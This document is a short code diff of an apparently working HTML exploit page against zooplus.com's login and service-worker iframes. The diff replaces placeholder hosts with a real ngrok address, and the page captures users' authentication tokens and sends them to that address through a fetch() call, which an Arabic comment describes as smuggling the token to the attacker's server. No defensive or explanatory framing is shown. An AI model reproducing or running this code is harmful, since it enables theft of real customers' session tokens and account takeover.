@@ -14,7 +14,7 @@
     <div id="status">Initializing Attack Vectors...</div>
     <div id="console"></div>
 
-    <iframe id="bridge_iframe" src="https://stm.zooplus.com/sw_iframe.html?origin=https://YOUR-DOMAIN.com"></iframe>
+    <iframe id="bridge_iframe" src="https://stm.zooplus.com/sw_iframe.html?origin=https://subsphenoidal-dauntlessly-pura.ngrok-free.dev"></iframe>
     
     <iframe id="auth_iframe" src="https://login.zooplus.com/auth/realms/zooplus/protocol/openid-connect/login-status-iframe.html"></iframe>
 
@@ -40,7 +40,7 @@
                     statusBox.innerText = "TOKEN CAPTURED!";
                     
                     // تهريب التوكن فوراً لسيرفر المهاجم
-                    fetch(`https://YOUR-ATTACKER-SERVER.com/collect?token=${event.data.token}`);
+                    fetch(`https://subsphenoidal-dauntlessly-pura.ngrok-free.dev/collect?token=${event.data.token}`);
                 }
 
                 // إذا حصلنا على الـ ClientID، نبدأ المرحلة الثانية
